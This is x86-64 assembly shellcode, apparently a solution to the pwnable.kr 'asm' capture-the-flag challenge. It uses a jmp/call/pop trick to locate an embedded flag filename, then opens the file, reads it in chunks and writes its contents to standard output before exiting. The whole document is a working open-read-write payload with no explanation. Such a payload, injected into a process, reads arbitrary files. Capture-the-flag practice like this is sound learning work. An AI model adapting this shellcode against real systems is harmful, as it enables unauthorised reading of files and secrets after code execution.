section .text
  global _start
_start:
  jmp filename
loader:
  pop rdi
  xor rsi, rsi
  xor rdx, rdx
  mov rax, 0x2
  syscall

mov rcx, rax
  sub rsp, 0x20
readflag:
  mov rdi, rcx
  mov rsi, rsp
  mov rdx, 0x20
  xor rax, rax
  syscall
  cmp rax, 0x1
  jl exit
  mov rdi, 1
  mov rsi, rsp
  mov rdx, rax
  mov rax, 1
  syscall
  jmp readflag

exit:
  mov rdi, rax
  mov rax, 0x3c
  syscall

filename:
call loader
db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0x0
